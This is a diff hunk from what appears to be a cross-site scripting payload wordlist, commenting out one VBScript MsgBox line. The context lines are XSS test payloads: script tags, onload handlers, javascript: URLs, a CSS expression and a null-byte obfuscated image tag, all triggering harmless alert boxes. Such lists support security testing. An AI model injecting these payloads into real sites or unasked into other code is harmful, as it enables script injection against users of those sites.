@@ -929,7 +929,7 @@ perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out
 "><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 [color=red width=expression(alert(123))][color]
 <BASE HREF="javascript:alert('XSS');//">
-Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+##Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
 "></iframe><script>alert(123)</script>
 <body onLoad="while(true) alert('XSS');">
 '"></title><script>alert(1111)</script>
